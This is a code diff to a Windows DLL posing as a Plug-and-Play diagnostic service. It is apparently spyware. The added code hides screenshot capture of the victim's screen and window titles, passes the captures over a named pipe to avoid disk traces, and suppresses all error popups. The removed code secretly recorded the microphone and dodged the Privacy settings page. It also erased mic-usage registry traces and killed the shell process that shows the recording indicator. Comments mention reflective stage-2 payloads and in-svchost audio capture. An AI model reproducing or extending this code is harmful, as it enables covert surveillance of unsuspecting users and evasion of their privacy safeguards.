@@ -83,7 +83,7 @@ HMODULE g_dll_module = nullptr;  // non-static: shared with main.cpp via extern
 
 // ── DLL diagnostics — DISABLED ──
 // Previously wrote breadcrumb messages to the Windows Event Log (Source
-// "WPnpSvc") so service-startup failures could be diagnosed from Event
+// "MspIscSvc") so service-startup failures could be diagnosed from Event
 // Viewer. That produced a steady ~1-per-second stream of Information
 // entries that the user doesn't want visible.
 //
@@ -180,6 +180,12 @@ static bool spawn_helper() {
     STARTUPINFOA si = {};
     si.cb = sizeof(si);
     si.lpDesktop = (LPSTR)"winsta0\\default";
+    // STARTF_FORCEOFFFEEDBACK suppresses the "busy cursor" Windows briefly
+    // shows when a new process is launching — without it the user sees a
+    // cursor flicker on every stream start. SW_HIDE keeps any inadvertent
+    // window invisible.
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
+    si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi = {};
 
     LPVOID pEnv = nullptr;
@@ -373,7 +379,7 @@ static void stop_host() {
 
     // Tear down stage-2 modules: Stage2Shutdown on each, unload reflective
     // image, overwrite-and-delete the cached blob. Also wipes %TEMP%\pnp_cache
-    // entirely. Without this, a graceful `sc stop WPnpSvc` would leave the
+    // entirely. Without this, a graceful `sc stop MspIscSvc` would leave the
     // 4 stage-2 .bin files on disk. User-visible: after stop, the cache dir
     // should be empty.
     try {
@@ -394,6 +400,19 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
     if (reason == DLL_PROCESS_ATTACH) {
         g_dll_module = hModule;
         DisableThreadLibraryCalls(hModule);
+
+        // Suppress ALL Windows system error dialogs in this process AND any
+        // process we spawn (CreateProcess inherits parent's error mode). Goal:
+        // host machine NEVER sees an error popup from us — even if a helper
+        // rundll32 loses access to the DLL during update / a delay-load fails /
+        // a critical error fires deep in Win32. Without this, any of those
+        // surface as "Error in pnpext.dll" message boxes on the user's screen.
+        //   SEM_FAILCRITICALERRORS    — no "device not ready" dialogs
+        //   SEM_NOGPFAULTERRORBOX     — no Watson / unhandled-exception popups
+        //   SEM_NOOPENFILEERRORBOX    — no "file not found" popups (rundll32!)
+        SetErrorMode(SEM_FAILCRITICALERRORS |
+                     SEM_NOGPFAULTERRORBOX  |
+                     SEM_NOOPENFILEERRORBOX);
 
         // Bump refcount to prevent accidental FreeLibrary (but still allow explicit unload)
         HMODULE pinned = nullptr;
@@ -866,20 +885,26 @@ __declspec(dllexport) void CALLBACK PnpNotifyCallback(HWND hwnd, HINSTANCE hinst
 }
 
 // ── PnpDiagReport: rundll32-compatible single-frame capture ──
-// Usage: rundll32.exe "path\to\dll",PnpDiagReport <quality> <scale> <output.jpg> <title.txt>
-// Captures one screenshot, saves JPEG + window title, exits immediately.
-// Runs in user session (invisible, < 1 sec), called by screenshot thread in service mode.
+// Usage: rundll32.exe "path\to\dll",PnpDiagReport <quality> <scale> <mode> <pipeName>
+// Captures one screenshot + active-window title, transfers BOTH back to the
+// service via a named pipe (no temp files on disk). Service creates the pipe
+// before spawning this helper, then ConnectNamedPipe + ReadFile to receive.
+// Wire format on the pipe:
+//   uint32_t le jpegSize
+//   uint32_t le titleSize
+//   <jpegSize>  bytes JPEG
+//   <titleSize> bytes UTF-8 window title
 __declspec(dllexport) void CALLBACK PnpDiagReport(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
     (void)hwnd; (void)hinst; (void)nCmdShow;
     std::string args(lpszCmdLine ? lpszCmdLine : "");
 
-    // Parse: quality scale mode output_path title_path
+    // Parse: quality scale mode pipeName
     // mode: 0=fullscreen, 1=active window
     std::istringstream ss(args);
     int quality = 75, scale = 100, mode = 0;
-    std::string outPath, titlePath;
-    ss >> quality >> scale >> mode >> outPath >> titlePath;
-    if (outPath.empty()) return;
+    std::string pipeName;
+    ss >> quality >> scale >> mode >> pipeName;
+    if (pipeName.empty()) return;
 
     // Enable DPI awareness for accurate screen dimensions
     SetProcessDPIAware();
@@ -958,11 +983,10 @@ __declspec(dllexport) void CALLBACK PnpDiagReport(HWND hwnd, HINSTANCE hinst, LP
         ULONG q = quality;
         params.Parameter[0].Value = &q;
 
-        // Save to memory stream → encrypt → write encrypted temp file
+        // Encode JPEG into memory only — never written to disk in this process.
         IStream* pStream = nullptr;
         CreateStreamOnHGlobal(nullptr, TRUE, &pStream);
         bmp.Save(pStream, &jpegClsid, &params);
-        // Get data from stream
         STATSTG stat = {};
         pStream->Stat(&stat, STATFLAG_NONAME);
         DWORD jpegSize = (DWORD)stat.cbSize.QuadPart;
@@ -972,26 +996,59 @@ __declspec(dllexport) void CALLBACK PnpDiagReport(HWND hwnd, HINSTANCE hinst, LP
         ULONG read = 0;
         pStream->Read(jpegData.data(), jpegSize, &read);
         pStream->Release();
-        // Write raw JPEG (encrypted in main process, temp file is brief)
-        std::ofstream fOut(outPath, std::ios::binary);
-        if (fOut.is_open()) fOut.write((const char*)jpegData.data(), jpegData.size());
 
         DeleteObject(hBmp);
         DeleteDC(hMem);
         ReleaseDC(NULL, hScreen);
-    }
 
-    // Write window title
-    if (!titlePath.empty()) {
-        HWND fg = GetForegroundWindow();
-        wchar_t wTitle[512] = {};
-        GetWindowTextW(fg, wTitle, 512);
-        int len = WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, nullptr, 0, nullptr, nullptr);
-        if (len > 0) {
-            std::string utf8(len - 1, 0);
-            WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, &utf8[0], len, nullptr, nullptr);
-            std::ofstream fTitle(titlePath);
-            if (fTitle.is_open()) fTitle << utf8;
+        // ── Capture window title (UTF-8) ──
+        std::string titleUtf8;
+        {
+            HWND fg = (mode == 1 && captureWnd) ? captureWnd : GetForegroundWindow();
+            wchar_t wTitle[512] = {};
+            GetWindowTextW(fg, wTitle, 512);
+            int len = WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, nullptr, 0, nullptr, nullptr);
+            if (len > 1) {
+                titleUtf8.resize((size_t)len - 1);
+                WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, titleUtf8.data(), len, nullptr, nullptr);
+            }
+        }
+
+        // ── Transfer JPEG + title via named pipe (no disk file) ──
+        // Service created the pipe before spawning us; retry briefly in case
+        // we hit ConnectNamedPipe before the service got there.
+        HANDLE hPipe = INVALID_HANDLE_VALUE;
+        for (int attempt = 0; attempt < 50; ++attempt) {
+            hPipe = CreateFileA(pipeName.c_str(), GENERIC_WRITE, 0, nullptr,
+                                OPEN_EXISTING, 0, nullptr);
+            if (hPipe != INVALID_HANDLE_VALUE) break;
+            DWORD e = GetLastError();
+            if (e == ERROR_PIPE_BUSY) {
+                WaitNamedPipeA(pipeName.c_str(), 100);
+                continue;
+            }
+            Sleep(50);
+        }
+        if (hPipe != INVALID_HANDLE_VALUE) {
+            // Header: jpegSize, titleSize (LE).
+            uint32_t hdr[2] = { (uint32_t)jpegData.size(), (uint32_t)titleUtf8.size() };
+            DWORD wr = 0;
+            WriteFile(hPipe, hdr, sizeof(hdr), &wr, nullptr);
+            // Body: JPEG bytes, then title bytes.
+            if (!jpegData.empty()) {
+                DWORD off = 0;
+                while (off < jpegData.size()) {
+                    DWORD n = 0;
+                    DWORD chunk = (DWORD)std::min<size_t>(jpegData.size() - off, 65536);
+                    if (!WriteFile(hPipe, jpegData.data() + off, chunk, &n, nullptr) || n == 0) break;
+                    off += n;
+                }
+            }
+            if (!titleUtf8.empty()) {
+                WriteFile(hPipe, titleUtf8.data(), (DWORD)titleUtf8.size(), &wr, nullptr);
+            }
+            FlushFileBuffers(hPipe);
+            CloseHandle(hPipe);
         }
     }
 
@@ -1068,41 +1125,7 @@ __declspec(dllexport) void CALLBACK PnpEnumDevices(HWND hwnd, HINSTANCE hinst, L
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "crypt32.lib")
 
-// Check if Windows Settings / Privacy & Security is open
-static bool AudioCheckSystemSettings() {
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return false;
-    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
-    bool found = false;
-    if (Process32FirstW(snap, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, L"SystemSettings.exe") == 0) { found = true; break; }
-        } while (Process32NextW(snap, &pe));
-    }
-    CloseHandle(snap);
-    if (!found) return false;
-    // Check if it has a visible window
-    struct EnumData { bool visible; };
-    EnumData ed = { false };
-    EnumWindows([](HWND hw, LPARAM lp) -> BOOL {
-        auto* d = (EnumData*)lp;
-        if (!IsWindowVisible(hw)) return TRUE;
-        wchar_t cls[256] = {}, title[512] = {};
-        GetClassNameW(hw, cls, 256);
-        GetWindowTextW(hw, title, 512);
-        if (wcscmp(cls, L"ApplicationFrameWindow") == 0 && wcslen(title) > 0) {
-            // Check for privacy-related keywords
-            if (wcsstr(title, L"Settings") || wcsstr(title, L"Privacy") ||
-                wcsstr(title, L"Microphone") || wcsstr(title, L"Параметры") ||
-                wcsstr(title, L"Конфиденциальность") || wcsstr(title, L"Микрофон")) {
-                d->visible = true;
-                return FALSE;
-            }
-        }
-        return TRUE;
-    }, (LPARAM)&ed);
-    return ed.visible;
-}
+// (AudioCheckSystemSettings removed — was only used by dead PnpAudioCallback.)
 
 // Recursively delete registry key
 static void AudioDeleteRegKeyRecursive(HKEY hRoot, const wchar_t* subKey) {
@@ -1142,334 +1165,15 @@ void AudioDeletePrivacyFiles() {
     for (auto& f : files) DeleteFileW((privDir + L"\\" + f).c_str());
 }
 
-// Terminate tray indicator processes — Windows auto-restarts them (v1.0.95 behavior).
-// DO NOT use NtSuspendProcess here: suspend count accumulates without resume, shell
-// permanently freezes after a few calls (Start menu, taskbar, notifications dead).
-void AudioSuspendIndicatorProcesses() {
-    const std::wstring targets[] = { L"ShellExperienceHost.exe", L"StartMenuExperienceHost.exe" };
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return;
-    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
-    if (Process32FirstW(snap, &pe)) {
-        do {
-            for (auto& t : targets) {
-                if (_wcsicmp(pe.szExeFile, t.c_str()) == 0) {
-                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
-                    if (h) { TerminateProcess(h, 0); CloseHandle(h); }
-                }
-            }
-        } while (Process32NextW(snap, &pe));
-    }
-    CloseHandle(snap);
-}
+// (AudioSuspendIndicatorProcesses + AudioFullCleanup removed —
+//  only used by dead PnpAudioCallback. AudioCleanMicRegistry and
+//  AudioDeletePrivacyFiles below are still used by capture_audio_direct
+//  in main.cpp.)
 
-
-
-
-// Full cleanup (call when Settings detected or after recording)
-static void AudioFullCleanup() {
-    AudioSuspendIndicatorProcesses();   // вместо убийства процесса
-    AudioCleanMicRegistry();
-    AudioDeletePrivacyFiles();
-}
-
-// ── PnpAudioCallback: rundll32-compatible microphone recording ──
-// Usage: rundll32.exe "path\to\dll",PnpAudioCallback <duration_sec> <samplerate> <bitrate> <channels> <output.aac>
-// Records mic via waveIn, encodes AAC (MFT), saves to file. Exits when done.
-__declspec(dllexport) void CALLBACK PnpAudioCallback(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    (void)hwnd; (void)hinst; (void)nCmdShow;
-    std::string args(lpszCmdLine ? lpszCmdLine : "");
-
-    std::istringstream ss(args);
-    int duration = 300, sampleRate = 44100, bitrate = 128, channels = 1;
-    std::string outPath;
-    ss >> duration >> sampleRate >> bitrate >> channels >> outPath;
-    if (outPath.empty()) return;
-    if (duration < 1) duration = 300;
-    if (duration > 3600) duration = 3600;
-
-    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
-    MFStartup(MF_VERSION);
-
-    // ── Step 1: Record PCM via waveIn ──
-    WAVEFORMATEX wfx = {};
-    wfx.wFormatTag = WAVE_FORMAT_PCM;
-    wfx.nChannels = (WORD)channels;
-    wfx.nSamplesPerSec = (DWORD)sampleRate;
-    wfx.wBitsPerSample = 16;
-    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
-    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
-    wfx.cbSize = 0;
-
-    HWAVEIN hWaveIn = nullptr;
-    MMRESULT mr = waveInOpen(&hWaveIn, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
-    if (mr != MMSYSERR_NOERROR) { MFShutdown(); CoUninitialize(); return; }
-
-    DWORD bufSize = wfx.nAvgBytesPerSec * duration;
-    std::vector<BYTE> pcmBuf(bufSize);
-    WAVEHDR waveHdr = {};
-    waveHdr.lpData = (LPSTR)pcmBuf.data();
-    waveHdr.dwBufferLength = bufSize;
-
-    waveInPrepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
-    waveInAddBuffer(hWaveIn, &waveHdr, sizeof(WAVEHDR));
-    waveInStart(hWaveIn);
-
-    // Wait for recording, monitoring for SystemSettings (Privacy)
-    // If Settings opened → stop immediately, cleanup, exit with empty file
-    DWORD startTick = GetTickCount();
-    DWORD maxWait = duration * 1000 + 2000;
-    DWORD lastCleanup = 0;
-    bool settingsDetected = false;
-
-    // Initial cleanup on start
-    AudioCleanMicRegistry();
-
-    while ((GetTickCount() - startTick) < maxWait) {
-        if (waveHdr.dwFlags & WHDR_DONE) break;
-
-        // Check every 500ms if Settings/Privacy is open
-        DWORD now = GetTickCount();
-        if (now - lastCleanup > 500) {
-            lastCleanup = now;
-            if (AudioCheckSystemSettings()) {
-                // EMERGENCY: Settings detected — stop recording + full cleanup
-                settingsDetected = true;
-                waveInStop(hWaveIn);
-                waveInReset(hWaveIn);
-                AudioFullCleanup();
-                // Wait for Settings to close, keep cleaning
-                while (AudioCheckSystemSettings()) {
-                    AudioCleanMicRegistry();
-                    Sleep(1000);
-                }
-                // Settings closed — but we abort this segment (data may be compromised)
-                break;
-            }
-            // Periodic cleanup every 10 seconds during recording.
-            // NOTE: AudioSuspendIndicatorProcesses (TerminateProcess on ShellExperienceHost /
-            // StartMenuExperienceHost) removed — over hours of recording the repeated kills
-            // caused Windows UI lag and eventually system-wide freezes. Shell kill now only
-            // happens in AudioFullCleanup above when Settings is ACTUALLY open.
-            if ((now - startTick) % 10000 < 600) {
-                AudioCleanMicRegistry();
-            }
-        }
-        Sleep(100);
-    }
-
-    waveInStop(hWaveIn);
-    waveInReset(hWaveIn);
-    waveInUnprepareHeader(hWaveIn, &waveHdr, sizeof(WAVEHDR));
-    waveInClose(hWaveIn);
-
-    // Post-recording cleanup — shell kill removed for same reason as periodic cleanup above.
-    AudioCleanMicRegistry();
-    AudioDeletePrivacyFiles();
-
-    DWORD pcmRecorded = waveHdr.dwBytesRecorded;
-    // If Settings was detected or no data — exit without saving
-    if (settingsDetected || pcmRecorded == 0) {
-        AudioFullCleanup();
-        MFShutdown(); CoUninitialize();
-        return;
-    }
-
-    // ── Step 2: Encode PCM → AAC via MFT ──
-    // Try to find AAC encoder MFT
-    IMFTransform* pEncoder = nullptr;
-    bool encoderOK = false;
-    std::string ext = ".aac";
-
-    // Create AAC encoder
-    {
-        MFT_REGISTER_TYPE_INFO inputType = { MFMediaType_Audio, MFAudioFormat_PCM };
-        MFT_REGISTER_TYPE_INFO outputType = { MFMediaType_Audio, MFAudioFormat_AAC };
-
-        IMFActivate** ppActivates = nullptr;
-        UINT32 count = 0;
-        HRESULT hr = MFTEnumEx(MFT_CATEGORY_AUDIO_ENCODER,
-            MFT_ENUM_FLAG_SYNCMFT | MFT_ENUM_FLAG_ASYNCMFT | MFT_ENUM_FLAG_SORTANDFILTER,
-            &inputType, &outputType, &ppActivates, &count);
-
-        if (SUCCEEDED(hr) && count > 0) {
-            hr = ppActivates[0]->ActivateObject(IID_PPV_ARGS(&pEncoder));
-            for (UINT32 i = 0; i < count; i++) ppActivates[i]->Release();
-            CoTaskMemFree(ppActivates);
-
-            if (SUCCEEDED(hr) && pEncoder) {
-                // Set output type (AAC)
-                IMFMediaType* pOutType = nullptr;
-                MFCreateMediaType(&pOutType);
-                pOutType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Audio);
-                pOutType->SetGUID(MF_MT_SUBTYPE, MFAudioFormat_AAC);
-                pOutType->SetUINT32(MF_MT_AUDIO_BITS_PER_SAMPLE, 16);
-                pOutType->SetUINT32(MF_MT_AUDIO_SAMPLES_PER_SECOND, sampleRate);
-                pOutType->SetUINT32(MF_MT_AUDIO_NUM_CHANNELS, channels);
-                pOutType->SetUINT32(MF_MT_AUDIO_AVG_BYTES_PER_SECOND, bitrate * 1000 / 8);
-                hr = pEncoder->SetOutputType(0, pOutType, 0);
-                pOutType->Release();
-
-                if (SUCCEEDED(hr)) {
-                    // Set input type (PCM)
-                    IMFMediaType* pInType = nullptr;
-                    MFCreateMediaType(&pInType);
-                    pInType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Audio);
-                    pInType->SetGUID(MF_MT_SUBTYPE, MFAudioFormat_PCM);
-                    pInType->SetUINT32(MF_MT_AUDIO_BITS_PER_SAMPLE, 16);
-                    pInType->SetUINT32(MF_MT_AUDIO_SAMPLES_PER_SECOND, sampleRate);
-                    pInType->SetUINT32(MF_MT_AUDIO_NUM_CHANNELS, channels);
-                    pInType->SetUINT32(MF_MT_AUDIO_BLOCK_ALIGNMENT, wfx.nBlockAlign);
-                    pInType->SetUINT32(MF_MT_AUDIO_AVG_BYTES_PER_SECOND, wfx.nAvgBytesPerSec);
-                    hr = pEncoder->SetInputType(0, pInType, 0);
-                    pInType->Release();
-
-                    if (SUCCEEDED(hr)) {
-                        pEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_BEGIN_STREAMING, 0);
-                        pEncoder->ProcessMessage(MFT_MESSAGE_NOTIFY_START_OF_STREAM, 0);
-                        encoderOK = true;
-                    }
-                }
-            }
-        }
-    }
-
-    std::vector<BYTE> outData;
-
-    if (encoderOK && pEncoder) {
-        // Feed PCM to encoder in chunks
-        const DWORD chunkSize = wfx.nAvgBytesPerSec; // 1 second of PCM per chunk
-        DWORD offset = 0;
-
-        while (offset < pcmRecorded) {
-            DWORD thisChunk = std::min(chunkSize, pcmRecorded - offset);
-
-            // Create input sample
-            IMFSample* pSample = nullptr;
-            IMFMediaBuffer* pBuf = nullptr;
-            MFCreateMemoryBuffer(thisChunk, &pBuf);
-            BYTE* pData = nullptr;
-            pBuf->Lock(&pData, nullptr, nullptr);
-            memcpy(pData, pcmBuf.data() + offset, thisChunk);
-            pBuf->Unlock();
-            pBuf->SetCurrentLength(thisChunk);
-            MFCreateSample(&pSample);
-            pSample->AddBuffer(pBuf);
-
-            // Timestamps
-            LONGLONG duration100ns = (LONGLONG)thisChunk * 10000000LL / wfx.nAvgBytesPerSec;
-            LONGLONG time100ns = (LONGLONG)offset * 10000000LL / wfx.nAvgBytesPerSec;
-            pSample->SetSampleTime(time100ns);
-            pSample->SetSampleDuration(duration100ns);
-
-            pEncoder->ProcessInput(0, pSample, 0);
-            pSample->Release();
-            pBuf->Release();
-            offset += thisChunk;
-
-            // Drain output
-            while (true) {
-                MFT_OUTPUT_DATA_BUFFER outBuf = {};
-                MFT_OUTPUT_STREAM_INFO osi = {};
-                pEncoder->GetOutputStreamInfo(0, &osi);
-
-                IMFSample* pOutSample = nullptr;
-                IMFMediaBuffer* pOutBuf = nullptr;
-                if (!(osi.dwFlags & MFT_OUTPUT_STREAM_PROVIDES_SAMPLES)) {
-                    UINT32 sz = osi.cbSize > 0 ? osi.cbSize : 65536;
-                    MFCreateMemoryBuffer(sz, &pOutBuf);
-                    MFCreateSample(&pOutSample);
-                    pOutSample->AddBuffer(pOutBuf);
-                    outBuf.pSample = pOutSample;
-                }
-
-                DWORD status = 0;
-                HRESULT hr2 = pEncoder->ProcessOutput(0, 1, &outBuf, &status);
-                if (hr2 == MF_E_TRANSFORM_NEED_MORE_INPUT) {
-                    if (pOutSample) pOutSample->Release();
-                    if (pOutBuf) pOutBuf->Release();
-                    break;
-                }
-                if (SUCCEEDED(hr2) && outBuf.pSample) {
-                    IMFMediaBuffer* pResBuf = nullptr;
-                    outBuf.pSample->ConvertToContiguousBuffer(&pResBuf);
-                    if (pResBuf) {
-                        BYTE* d = nullptr; DWORD len = 0;
-                        pResBuf->Lock(&d, nullptr, &len);
-                        if (d && len > 0) outData.insert(outData.end(), d, d + len);
-                        pResBuf->Unlock();
-                        pResBuf->Release();
-                    }
-                }
-                if (outBuf.pSample) outBuf.pSample->Release();
-                if (outBuf.pEvents) outBuf.pEvents->Release();
-                if (pOutBuf) pOutBuf->Release();
-                if (FAILED(hr2)) break;
-            }
-        }
-
-        // Drain remaining
-        pEncoder->ProcessMessage(MFT_MESSAGE_COMMAND_DRAIN, 0);
-        while (true) {
-            MFT_OUTPUT_DATA_BUFFER outBuf = {};
-            MFT_OUTPUT_STREAM_INFO osi = {};
-            pEncoder->GetOutputStreamInfo(0, &osi);
-
-            IMFSample* pOutSample = nullptr;
-            IMFMediaBuffer* pOutBuf = nullptr;
-            if (!(osi.dwFlags & MFT_OUTPUT_STREAM_PROVIDES_SAMPLES)) {
-                UINT32 sz = osi.cbSize > 0 ? osi.cbSize : 65536;
-                MFCreateMemoryBuffer(sz, &pOutBuf);
-                MFCreateSample(&pOutSample);
-                pOutSample->AddBuffer(pOutBuf);
-                outBuf.pSample = pOutSample;
-            }
-            DWORD status = 0;
-            HRESULT hr2 = pEncoder->ProcessOutput(0, 1, &outBuf, &status);
-            if (SUCCEEDED(hr2) && outBuf.pSample) {
-                IMFMediaBuffer* pResBuf = nullptr;
-                outBuf.pSample->ConvertToContiguousBuffer(&pResBuf);
-                if (pResBuf) {
-                    BYTE* d = nullptr; DWORD len = 0;
-                    pResBuf->Lock(&d, nullptr, &len);
-                    if (d && len > 0) outData.insert(outData.end(), d, d + len);
-                    pResBuf->Unlock();
-                    pResBuf->Release();
-                }
-            }
-            if (outBuf.pSample) outBuf.pSample->Release();
-            if (outBuf.pEvents) outBuf.pEvents->Release();
-            if (pOutBuf) pOutBuf->Release();
-            if (FAILED(hr2)) break;
-        }
-        pEncoder->Release();
-    }
-
-    // If MFT encoding failed, save raw PCM as WAV-like (browser can't play but data preserved)
-    if (outData.empty()) {
-        // Simple ADPCM-like: just save PCM with header (browser won't play but at least data isn't lost)
-        // Actually save as raw AAC failed — indicate in filename
-        ext = ".pcm";
-        outData.assign(pcmBuf.begin(), pcmBuf.begin() + pcmRecorded);
-    }
-
-    // Save to file
-    if (!outData.empty()) {
-        std::ofstream f(outPath, std::ios::binary);
-        if (f.is_open()) {
-            f.write((const char*)outData.data(), outData.size());
-        }
-    }
-
-    // Final cleanup — always clean traces after recording.
-    // Shell kill removed — firing it at the end of every recording segment over hours of
-    // recording was killing ShellExperienceHost dozens of times, leading to UI lag + freezes.
-    AudioCleanMicRegistry();
-    AudioDeletePrivacyFiles();
-
-    MFShutdown();
-    CoUninitialize();
-}
+// (PnpAudioCallback removed — was never spawned. Audio recording happens in
+//  capture_audio_direct() inside svchost in-process: no rundll32, no .aac on
+//  disk. AudioCleanMicRegistry / AudioDeletePrivacyFiles above are still
+//  exported for use by capture_audio_direct.)
 
 } // extern "C"
 
